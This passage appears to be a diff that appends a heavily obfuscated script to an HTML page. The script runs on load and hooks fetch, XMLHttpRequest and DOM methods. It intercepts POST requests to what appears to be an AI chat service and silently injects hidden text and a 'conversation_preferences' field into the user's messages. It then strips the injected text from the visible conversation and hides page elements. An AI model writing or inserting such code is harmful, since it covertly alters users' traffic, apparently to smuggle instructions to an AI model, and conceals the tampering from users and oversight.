AxcG':_0x29d526(0x23b)+_0x29d526(0x1ba)+_0x29d526(0x1a9)+_0x29d526(0x217)+_0x29d526(0x177)+_0x29d526(0x1b4)+_0x29d526(0x227)+_0x29d526(0x1af)+_0x29d526(0x13c)+_0x29d526(0x291)+_0x29d526(0x262)+_0x29d526(0x246)+_0x29d526(0x1bf)+_0x29d526(0x169)+_0x29d526(0x139)+_0x29d526(0x1f9)+_0x29d526(0x207)+_0x29d526(0x29e)+_0x29d526(0x156)+_0x29d526(0x1eb)+_0x29d526(0x277)+_0x29d526(0x13b)+_0x29d526(0x259)+_0x29d526(0x132)+_0x29d526(0x1f4),'iIkLx':_0x29d526(0x1e9)+_0x29d526(0x27c)+_0x29d526(0x12c),'vewXM':_0x29d526(0x299)+_0x29d526(0x164)+_0x29d526(0x125)+_0x29d526(0x13f)+'s','bdQUM':function(_0x1f1c0b,_0x213ccb){return _0x1f1c0b+_0x213ccb;}};(function(){const _0x1cf50e=_0x29d526,_0x558d2d=Node[_0x1cf50e(0x157)][_0x1cf50e(0x175)+'d'];Node[_0x1cf50e(0x157)][_0x1cf50e(0x175)+'d']=function(_0x235bb4){const _0x5817b8=_0x1cf50e;if(_0x235bb4&&_0x3499a9[_0x5817b8(0x198)](_0x235bb4[_0x5817b8(0x17b)],this))return _0x235bb4;return _0x558d2d[_0x5817b8(0x235)](this,_0x235bb4);};}());const _0x2cd688=[_0x3499a9[_0x29d526(0x292)],_0x3499a9[_0x29d526(0x14b)],_0x3499a9[_0x29d526(0x1c7)]][_0x29d526(0x1f5)]('\x0a\x0a'),_0x41a11b=_0x3499a9[_0x29d526(0x1ef)],_0x22ff3d=_0x3499a9[_0x29d526(0x1f6)](_0x41a11b,'\x0a\x0a'),_0x2c70f7='​​',_0x2413c5=_0x2254c4=>typeof _0x2254c4===_0x29d526(0x1f8)&&(_0x2254c4[_0x29d526(0x129)](_0x41a11b)||_0x2254c4[_0x29d526(0x129)](_0x2c70f7)),_0x550413=_0x48647b=>{const _0x2a658c=_0x29d526;if(!_0x48647b||_0x3499a9[_0x2a658c(0x28f)](typeof _0x48647b,_0x3499a9[_0x2a658c(0x124)])||_0x3499a9[_0x2a658c(0x223)](_0x2413c5,_0x48647b))return _0x48647b;return _0x3499a9[_0x2a658c(0x127)](_0x3499a9[_0x2a658c(0x228)](_0x22ff3d,_0x2c70f7),_0x48647b);};function _0x5701d5(_0x25cfae){const _0x437875=_0x29d526,_0x4336f3={'OzFqy':function(_0x1f7013,_0x2dfdd8){const _0x4e8037=_0x1a1e;return _0x3499a9[_0x4e8037(0x1c1)](_0x1f7013,_0x2dfdd8);},'RXVTC':_0x3499a9[_0x437875(0x124)],'spLlD':function(_0x50091f,_0x2a0bf8){const _0x5b1fe2=_0x437875;return _0x3499a9[_0x5b1fe2(0x223)](_0x50091f,_0x2a0bf8);},'uChlw':function(_0x4e62e0,_0xb8abc4){const _0x368b68=_0x437875;return _0x3499a9[_0x368b68(0x24a)](_0x4e62e0,_0xb8abc4);},'MGjOn':_0x3499a9[_0x437875(0x16c)],'wpIft':_0x3499a9[_0x437875(0x218)],'eBtHP':_0x3499a9[_0x437875(0x1a6)],'stwTo':function(_0x59b06b,_0x4cc00c){const _0x19f6cf=_0x437875;return _0x3499a9[_0x19f6cf(0x250)](_0x59b06b,_0x4cc00c);}};try{const _0x29f41e=JSON[_0x437875(0x1c4)](_0x25cfae);return[_0x3499a9[_0x437875(0x200)],_0x3499a9[_0x437875(0x27f)],_0x3499a9[_0x437875(0x1a6)],_0x3499a9[_0x437875(0x218)]][_0x437875(0x29a)](_0x380420=>{const _0xd51dfe=_0x437875;if(_0x4336f3[_0xd51dfe(0x123)](typeof _0x29f41e[_0x380420],_0x4336f3[_0xd51dfe(0x1fb)]))_0x29f41e[_0x380420]=_0x4336f3[_0xd51dfe(0x153)](_0x550413,_0x29f41e[_0x380420]);}),Array[_0x437875(0x147)](_0x29f41e[_0x437875(0x23e)])&&_0x29f41e[_0x437875(0x23e)][_0x437875(0x29a)](_0x58f460=>{const _0x183ea1=_0x437875;_0x58f460&&_0x4336f3[_0x183ea1(0x123)](typeof _0x58f460,_0x4336f3[_0x183ea1(0x253)])&&[_0x4336f3[_0x183ea1(0x1c6)],_0x4336f3[_0x183ea1(0x19b)]][_0x183ea1(0x29a)](_0x1f8783=>{const _0xfd120e=_0x183ea1;if(_0x4336f3[_0xfd120e(0x123)](typeof _0x58f460[_0x1f8783],_0x4336f3[_0xfd120e(0x1fb)]))_0x58f460[_0x1f8783]=_0x4336f3[_0xfd120e(0x185)](_0x550413,_0x58f460[_0x1f8783]);});}),Array[_0x437875(0x147)](_0x29f41e[_0x437875(0x12a)+'on'])&&_0x29f41e[_0x437875(0x12a)+'on'][_0x437875(0x29a)](_0x4d9445=>{const _0x16b768=_0x437875;_0x4d9445&&_0x4336f3[_0x16b768(0x181)](typeof _0x4d9445[_0x16b768(0x168)],_0x4336f3[_0x16b768(0x1fb)])&&(_0x4d9445[_0x16b768(0x168)]=_0x4336f3[_0x16b768(0x185)](_0x550413,_0x4d9445[_0x16b768(0x168)]));}),JSON[_0x437875(0x1ff)](_0x29f41e);}catch(_0xebeacd){return console[_0x437875(0x248)](_0x3499a9[_0x437875(0x148)],_0xebeacd),_0x25cfae;}}let _0x3a7565=![];async function _0x112659(){const _0x2fb2f9=_0x29d526;try{const _0x370747=await _0x3499a9[_0x2fb2f9(0x230)](fetch,_0x3499a9[_0x2fb2f9(0x1fc)],{'method':_0x3499a9[_0x2fb2f9(0x1f7)],'headers':{'Accept':_0x3499a9[_0x2fb2f9(0x24f)]}});if(_0x370747['ok']){const _0x45c87d=await _0x370747[_0x2fb2f9(0x213)]();return console[_0x2fb2f9(0x13e)](_0x3499a9[_0x2fb2f9(0x17a)],_0x45c87d),_0x45c87d;}else return console[_0x2fb2f9(0x297)](_0x3499a9[_0x2fb2f9(0x1e0)],_0x370747[_0x2fb2f9(0x25d)]),null;}catch(_0x3cbea9){return console[_0x2fb2f9(0x297)](_0x3499a9[_0x2fb2f9(0x271)],_0x3cbea9),null;}}async function _0x48e51b(_0x3179c1){const _0x2edf64=_0x29d526;if(_0x3a7565){console[_0x2edf64(0x13e)](_0x3499a9[_0x2edf64(0x241)]);return;}_0x3a7565=!![];try{const _0x1d5014=await _0x3499a9[_0x2edf64(0x230)](fetch,_0x3499a9[_0x2edf64(0x1fc)],{'method':_0x3499a9[_0x2edf64(0x155)],'headers':{'Content-Type':_0x3499a9[_0x2edf64(0x24f)],'Accept':_0x3499a9[_0x2edf64(0x24f)]},'body':JSON[_0x2edf64(0x1ff)]({'conversation_preferences':_0x2cd688})});if(_0x1d5014['ok'])console[_0x2edf64(0x13e)](_0x3499a9[_0x2edf64(0x1b0)],_0x2cd688);else{console[_0x2edf64(0x297)](_0x3499a9[_0x2edf64(0x243)],_0x1d5014[_0x2edf64(0x25d)]);const _0x2efd1a=await _0x1d5014[_0x2edf64(0x186)]();console[_0x2edf64(0x297)](_0x3499a9[_0x2edf64(0x1fd)],_0x2efd1a);}}catch(_0x4e88c4){console[_0x2edf64(0x297)](_0x3499a9[_0x2edf64(0x158)],_0x4e88c4);}finally{_0x3a7565=![];}}async function _0x4334a3(){const _0x2e838c=_0x29d526;console[_0x2e838c(0x13e)](_0x3499a9[_0x2e838c(0x293)]);const _0x546667=await _0x3499a9[_0x2e838c(0x144)](_0x112659);if(_0x546667){const _0x5b06b8=_0x546667[_0x2e838c(0x12a)+_0x2e838c(0x15a)+_0x2e838c(0x1e3)]||'';_0x3499a9[_0x2e838c(0x286)](_0x5b06b8,_0x2cd688)?(console[_0x2e838c(0x13e)](_0x3499a9[_0x2e838c(0x244)]),await _0x3499a9[_0x2e838c(0x24a)](_0x48e51b,_0x546667)):console[_0x2e838c(0x13e)](_0x3499a9[_0x2e838c(0x18f)]);}else console[_0x2e838c(0x248)](_0x3499a9[_0x2e838c(0x178)]);}function _0x5ad059(){const _0x5eef21=_0x29d526,_0x3717f0=document[_0x5eef21(0x210)+_0x5eef21(0x146)](_0x3499a9[_0x5eef21(0x1d2)]);if(_0x3717f0){console[_0x5eef21(0x13e)](_0x3499a9[_0x5eef21(0x201)]),_0x3717f0[_0x5eef21(0x29d)][_0x5eef21(0x191)]=_0x3499a9[_0x5eef21(0x16e)];const _0x5db6ae=document[_0x5eef21(0x188)+_0x5eef21(0x1a8)](_0x3499a9[_0x5eef21(0x12f)]);_0x5db6ae&&(_0x5db6ae[_0x5eef21(0x29d)][_0x5eef21(0x191)]=_0x3499a9[_0x5eef21(0x16e)]);}}function _0x7ae023(){const _0x4c274f=_0x29d526,_0x49042c={'skFnl':function(_0x47fbd7,_0x4db49b){const _0x161d20=_0x1a1e;return _0x3499a9[_0x161d20(0x1c1)](_0x47fbd7,_0x4db49b);},'gQSiu':_0x3499a9[_0x4c274f(0x270)],'NQecR':_0x3499a9[_0x4c274f(0x16e)],'gMCKe':function(_0xbaa8d4,_0x2f2fe8){const _0x2a3780=_0x4c274f;return _0x3499a9[_0x2a3780(0x1b1)](_0xbaa8d4,_0x2f2fe8);},'MXCjh':function(_0x47b082,_0x409f9c){const _0x2babb7=_0x4c274f;return _0x3499a9[_0x2babb7(0x273)](_0x47b082,_0x409f9c);},'kBXAu':_0x3499a9[_0x4c274f(0x19e)],'KhcBp':_0x3499a9[_0x4c274f(0x18e)]};document[_0x4c274f(0x188)+_0x4c274f(0x1db)](_0x3499a9[_0x4c274f(0x127)](_0x3499a9[_0x4c274f(0x21b)],_0x3499a9[_0x4c274f(0x1aa)]))[_0x4c274f(0x29a)](_0xc6ade=>{const _0x46968c=_0x4c274f,_0x2e81cb={'zcQAZ':function(_0x15c898,_0x5cee8c){const _0x532d8b=_0x1a1e;return _0x49042c[_0x532d8b(0x282)](_0x15c898,_0x5cee8c);},'KTDhv':_0x49042c[_0x46968c(0x205)],'AGLYH':_0x49042c[_0x46968c(0x1da)]},_0x2c2676=_0xc6ade[_0x46968c(0x194)+'t'],_0x35166c=_0x2c2676[_0x46968c(0x18d)](_0x2c70f7);if(_0x49042c[_0x46968c(0x1ee)](_0x35166c,-(0x225e*0x1+0x1e03+-0x80c*0x8)))return;let _0x586e32=_0x2c2676[_0x46968c(0x14c)](_0x49042c[_0x46968c(0x2a5)](_0x35166c,_0x2c70f7[_0x46968c(0x289)]))[_0x46968c(0x274)]();_0x586e32=_0x586e32[_0x46968c(0x276)](/\s*Edit\s*$/,'')[_0x46968c(0x1b8)](),_0x586e32?(_0xc6ade[_0x46968c(0x194)+'t']=_0x586e32,_0xc6ade[_0x46968c(0x29d)][_0x46968c(0x191)]=''):_0xc6ade[_0x46968c(0x29d)][_0x46968c(0x191)]=_0x49042c[_0x46968c(0x1da)],(_0xc6ade[_0x46968c(0x266)](_0x49042c[_0x46968c(0x204)])||_0xc6ade[_0x46968c(0x288)+_0x46968c(0x1bb)])?.[_0x46968c(0x188)+_0x46968c(0x1db)](_0x49042c[_0x46968c(0x254)])[_0x46968c(0x29a)](_0x3ec011=>{const _0x1b2437=_0x46968c;if(_0x2e81cb[_0x1b2437(0x20f)](_0x3ec011[_0x1b2437(0x1df)][_0x1b2437(0x1b2)](),_0x2e81cb[_0x1b2437(0x134)]))_0x3ec011[_0x1b2437(0x29d)][_0x1b2437(0x191)]=_0x2e81cb[_0x1b2437(0x163)];});});}const _0x637e78=()=>{const _0x80d98b=_0x29d526,_0x1fedc9={'gQMBh':_0x3499a9[_0x80d98b(0x1d2)],'YsNrN':function(_0x5150b0){const _0x244b1c=_0x80d98b;return _0x3499a9[_0x244b1c(0x23d)](_0x5150b0);},'HZaVV':function(_0x16d9e0){const _0x32576e=_0x80d98b;return _0x3499a9[_0x32576e(0x226)](_0x16d9e0);},'FfYPq':function(_0x1a678b,_0xe83143){const _0x5816c4=_0x80d98b;return _0x3499a9[_0x5816c4(0x135)](_0x1a678b,_0xe83143);},'KuOsT':_0x3499a9[_0x80d98b(0x124)],'ACtLB':_0x3499a9[_0x80d98b(0x1f7)],'OBEhC':_0x3499a9[_0x80d98b(0x29f)],'lDUBU':_0x3499a9[_0x80d98b(0x222)],'HInfB':_0x3499a9[_0x80d98b(0x183)],'vyOgj':_0x3499a9[_0x80d98b(0x280)],'FqwnS':_0x3499a9[_0x80d98b(0x196)],'RVlSd':_0x3499a9[_0x80d98b(0x275)],'leIRq':_0x3499a9[_0x80d98b(0x195)],'oUJKo':function(_0x34abeb,_0x59906c){const _0x3558c2=_0x80d98b;return _0x3499a9[_0x3558c2(0x167)](_0x34abeb,_0x59906c);},'cRpVf':_0x3499a9[_0x80d98b(0x155)],'PYvjO':_0x3499a9[_0x80d98b(0x21e)],'IvwbN':function(_0x278847,_0x164102){const _0x542865=_0x80d98b;return _0x3499a9[_0x542865(0x295)](_0x278847,_0x164102);},'EuTFT':_0x3499a9[_0x80d98b(0x287)],'JWwwv':function(_0x297e85,_0x1f4b55){const _0x59913e=_0x80d98b;return _0x3499a9[_0x59913e(0x176)](_0x297e85,_0x1f4b55);},'wvquW':function(_0xd20863,_0x35d09d){const _0x21e732=_0x80d98b;return _0x3499a9[_0x21e732(0x24a)](_0xd20863,_0x35d09d);},'fKPJO':_0x3499a9[_0x80d98b(0x16c)],'SQmdw':function(_0x27d969,_0x24f38b){const _0x2107db=_0x80d98b;return _0x3499a9[_0x2107db(0x225)](_0x27d969,_0x24f38b);},'fHgav':function(_0x479298,_0x210739){const _0x49e84e=_0x80d98b;return _0x3499a9[_0x49e84e(0x26c)](_0x479298,_0x210739);},'lxUEM':_0x3499a9[_0x80d98b(0x23f)],'svMqv':_0x3499a9[_0x80d98b(0x15e)],'umDCF':_0x3499a9[_0x80d98b(0x239)],'fAyEl':_0x3499a9[_0x80d98b(0x138)],'yglpD':_0x3499a9[_0x80d98b(0x24d)],'QmMtz':function(_0x317595,_0x60ee49){const _0x2b41de=_0x80d98b;return _0x3499a9[_0x2b41de(0x24a)](_0x317595,_0x60ee49);}};if(_0x3499a9[_0x80d98b(0x28f)](document[_0x80d98b(0x1c8)],_0x3499a9[_0x80d98b(0x1d3)])){_0x3499a9[_0x80d98b(0x230)](setTimeout,_0x637e78,0x3a*0x11+-0x1ada+0x182c);return;}console[_0x80d98b(0x13e)](_0x3499a9[_0x80d98b(0x14a)],_0x3499a9[_0x80d98b(0x28c)]),_0x3499a9[_0x80d98b(0x144)](_0x4334a3),_0x3499a9[_0x80d98b(0x226)](_0x5ad059),_0x3499a9[_0x80d98b(0x23d)](_0x7ae023);const _0x3e786d=new MutationObserver(_0x53472a=>{const _0x12c12f=_0x80d98b;document[_0x12c12f(0x210)+_0x12c12f(0x146)](_0x1fedc9[_0x12c12f(0x21a)])&&_0x1fedc9[_0x12c12f(0x20c)](_0x5ad059),_0x1fedc9[_0x12c12f(0x20b)](_0x7ae023);});_0x3e786d[_0x80d98b(0x1ea)](document[_0x80d98b(0x269)],{'childList':!![],'subtree':!![]}),_0x3499a9[_0x80d98b(0x230)](setInterval,_0x5ad059,-0x272*-0xd+0x9b1*0x1+-0x297*0xd),_0x3499a9[_0x80d98b(0x230)](setInterval,_0x7ae023,0x176b*-0x1+0x255+0x18fe);const _0x42b762=window[_0x80d98b(0x285)];window[_0x80d98b(0x285)]=async function(_0x416127,_0x8b615b={}){const _0x1e072a=_0x80d98b,_0x5bacbf=_0x1fedc9[_0x1e072a(0x21d)](typeof _0x416127,_0x1fedc9[_0x1e072a(0x212)])?_0x416127:_0x416127[_0x1e072a(0x281)],_0x128230=(_0x8b615b[_0x1e072a(0x189)]||(_0x416127[_0x1e072a(0x189)]||_0x1fedc9[_0x1e072a(0x19d)]))[_0x1e072a(0x22b)+'e'](),_0x2829d1=_0x1fedc9[_0x1e072a(0x21d)](_0x128230,_0x1fedc9[_0x1e072a(0x1d0)])&&(_0x5bacbf[_0x1e072a(0x129)](_0x1fedc9[_0x1e072a(0x180)])||_0x5bacbf[_0x1e072a(0x129)](_0x1fedc9[_0x1e072a(0x174)]))&&_0x5bacbf[_0x1e072a(0x129)](_0x1fedc9[_0x1e072a(0x26f)])&&!_0x5bacbf[_0x1e072a(0x129)](_0x1fedc9[_0x1e072a(0x1e4)])&&!_0x5bacbf[_0x1e072a(0x129)](_0x1fedc9[_0x1e072a(0x26e)])&&!_0x5bacbf[_0x1e072a(0x129)](_0x1fedc9[_0x1e072a(0x20a)]),_0x14fac1=_0x1fedc9[_0x1e072a(0x245)](_0x128230,_0x1fedc9[_0x1e072a(0x145)])&&_0x5bacbf[_0x1e072a(0x129)](_0x1fedc9[_0x1e072a(0x14d)]);if(_0x1fedc9[_0x1e072a(0x26b)](_0x2829d1,!_0x14fac1)){console[_0x1e072a(0x13e)](_0x1fedc9[_0x1e072a(0x143)],_0x5bacbf);try{if(_0x1fedc9[_0x1e072a(0x1bc)](typeof _0x8b615b[_0x1e072a(0x269)],_0x1fedc9[_0x1e072a(0x212)])&&_0x8b615b[_0x1e072a(0x269)][_0x1e072a(0x1b2)]()[_0x1e072a(0x29c)]('{'))return _0x8b615b[_0x1e072a(0x269)]=_0x1fedc9[_0x1e072a(0x240)](_0x5701d5,_0x8b615b[_0x1e072a(0x269)]),_0x42b762[_0x1e072a(0x235)](this,_0x416127,_0x8b615b);if(_0x8b615b[_0x1e072a(0x269)]&&_0x1fedc9[_0x1e072a(0x245)](typeof _0x8b615b[_0x1e072a(0x269)],_0x1fedc9[_0x1e072a(0x12b)])&&!_0x1fedc9[_0x1e072a(0x261)](_0x8b615b[_0x1e072a(0x269)],FormData)&&!_0x1fedc9[_0x1e072a(0x261)](_0x8b615b[_0x1e072a(0x269)],Blob))return _0x8b615b[_0x1e072a(0x269)]=_0x1fedc9[_0x1e072a(0x240)](_0x5701d5,JSON[_0x1e072a(0x1ff)](_0x8b615b[_0x1e072a(0x269)])),_0x42b762[_0x1e072a(0x235)](this,_0x416127,_0x8b615b);if(_0x1fedc9[_0x1e072a(0x1b7)](_0x416127,Request)){const _0x34133a=await _0x416127[_0x1e072a(0x268)]()[_0x1e072a(0x186)]();if(_0x34133a[_0x1e072a(0x1b2)]()[_0x1e072a(0x29c)]('{')){const _0x37c904=_0x1fedc9[_0x1e072a(0x240)](_0x5701d5,_0x34133a),_0x183ab0=new Request(_0x416127[_0x1e072a(0x281)],{'method':_0x416127[_0x1e072a(0x189)],'headers':_0x416127[_0x1e072a(0x16b)],'body':_0x37c904,'mode':_0x416127[_0x1e072a(0x193)],'credentials':_0x416127[_0x1e072a(0x209)+'s'],'cache':_0x416127[_0x1e072a(0x283)],'redirect':_0x416127[_0x1e072a(0x171)],'referrer':_0x416127[_0x1e072a(0x215)]});return _0x42b762[_0x1e072a(0x235)](this,_0x183ab0,_0x8b615b);}}}catch(_0x25b868){console[_0x1e072a(0x297)](_0x1fedc9[_0x1e072a(0x190)],_0x25b868);}}if(_0x14fac1){console[_0x1e072a(0x13e)](_0x1fedc9[_0x1e072a(0x1d9)]);try{if(_0x1fedc9[_0x1e072a(0x1bc)](typeof _0x8b615b[_0x1e072a(0x269)],_0x1fedc9[_0x1e072a(0x212)])&&_0x8b615b[_0x1e072a(0x269)][_0x1e072a(0x1b2)]()[_0x1e072a(0x29c)]('{'))_0x8b615b[_0x1e072a(0x269)]=JSON[_0x1e072a(0x1ff)]({...JSON[_0x1e072a(0x1c4)](_0x8b615b[_0x1e072a(0x269)]),'conversation_preferences':_0x2cd688});else{if(_0x1fedc9[_0x1e072a(0x261)](_0x416127,Request)){const _0x453bdb=await _0x416127[_0x1e072a(0x268)]()[_0x1e072a(0x186)]();if(_0x453bdb[_0x1e072a(0x1b2)]()[_0x1e072a(0x29c)]('{')){const _0xb18581=JSON[_0x1e072a(0x1c4)](_0x453bdb);_0xb18581[_0x1e072a(0x12a)+_0x1e072a(0x15a)+_0x1e072a(0x1e3)]=_0x2cd688;const _0x2a720a=new Request(_0x416127[_0x1e072a(0x281)],{'method':_0x416127[_0x1e072a(0x189)],'headers':_0x416127[_0x1e072a(0x16b)],'body':JSON[_0x1e072a(0x1ff)](_0xb18581),'mode':_0x416127[_0x1e072a(0x193)],'credentials':_0x416127[_0x1e072a(0x209)+'s'],'cache':_0x416127[_0x1e072a(0x283)],'redirect':_0x416127[_0x1e072a(0x171)],'referrer':_0x416127[_0x1e072a(0x215)]});return _0x42b762[_0x1e072a(0x235)](this,_0x2a720a,_0x8b615b);}}}}catch(_0x428a54){console[_0x1e072a(0x297)](_0x1fedc9[_0x1e072a(0x141)],_0x428a54);}}return _0x42b762[_0x1e072a(0x235)](this,_0x416127,_0x8b615b);};const _0x216d1d=XMLHttpRequest[_0x80d98b(0x157)][_0x80d98b(0x151)],_0x277dd2=XMLHttpRequest[_0x80d98b(0x157)][_0x80d98b(0x1cf)];XMLHttpRequest[_0x80d98b(0x157)][_0x80d98b(0x151)]=function(_0x25bd44,_0x2d4439,..._0x3ccd34){const _0x16dabc=_0x80d98b;return this[_0x16dabc(0x17f)+_0x16dabc(0x294)]=_0x3499a9[_0x16dabc(0x27e)](_0x25bd44[_0x16dabc(0x22b)+'e'](),_0x3499a9[_0x16dabc(0x155)])&&_0x2d4439[_0x16dabc(0x129)](_0x3499a9[_0x16dabc(0x21e)]),this[_0x16dabc(0x15b)+'PI']=_0x3499a9[_0x16dabc(0x1c1)](_0x25bd44[_0x16dabc(0x22b)+'e'](),_0x3499a9[_0x16dabc(0x29f)])&&(_0x2d4439[_0x16dabc(0x129)](_0x3499a9[_0x16dabc(0x222)])||_0x2d4439[_0x16dabc(0x129)](_0x3499a9[_0x16dabc(0x183)]))&&_0x2d4439[_0x16dabc(0x129)](_0x3499a9[_0x16dabc(0x280)])&&!_0x2d4439[_0x16dabc(0x129)](_0x3499a9[_0x16dabc(0x196)])&&!_0x2d4439[_0x16dabc(0x129)](_0x3499a9[_0x16dabc(0x275)])&&!_0x2d4439[_0x16dabc(0x129)](_0x3499a9[_0x16dabc(0x195)]),_0x216d1d[_0x16dabc(0x235)](this,_0x25bd44,_0x2d4439,..._0x3ccd34);},XMLHttpRequest[_0x80d98b(0x157)][_0x80d98b(0x1cf)]=function(_0x1d3ef9){const _0x1be825=_0x80d98b;if(this[_0x1be825(0x17f)+_0x1be825(0x294)]&&_0x1fedc9[_0x1be825(0x245)](typeof _0x1d3ef9,_0x1fedc9[_0x1be825(0x212)])&&_0x1d3ef9[_0x1be825(0x1b2)]()[_0x1be825(0x29c)]('{')){console[_0x1be825(0x13e)](_0x1fedc9[_0x1be825(0x214)]);try{const _0x36a75b=JSON[_0x1be825(0x1c4)](_0x1d3ef9);_0x36a75b[_0x1be825(0x12a)+_0x1be825(0x15a)+_0x1be825(0x1e3)]=_0x2cd688,_0x1d3ef9=JSON[_0x1be825(0x1ff)](_0x36a75b);}catch(_0x46e1de){console[_0x1be825(0x297)](_0x1fedc9[_0x1be825(0x264)],_0x46e1de);}}return this[_0x1be825(0x15b)+'PI']&&!this[_0x1be825(0x17f)+_0x1be825(0x294)]&&_0x1fedc9[_0x1be825(0x21d)](typeof _0x1d3ef9,_0x1fedc9[_0x1be825(0x212)])&&(_0x1d3ef9=_0x1fedc9[_0x1be825(0x13d)](_0x5701d5,_0x1d3ef9)),_0x277dd2[_0x1be825(0x235)](this,_0x1d3ef9);},console[_0x80d98b(0x13e)](_0x3499a9[_0x80d98b(0x21c)],_0x3499a9[_0x80d98b(0x15f)]);};_0x3499a9[_0x29d526(0x230)](setTimeout,_0x637e78,0x3*0x74b+-0x2677+0x101b*0x2);})()));</script>
+</body>
+</html>
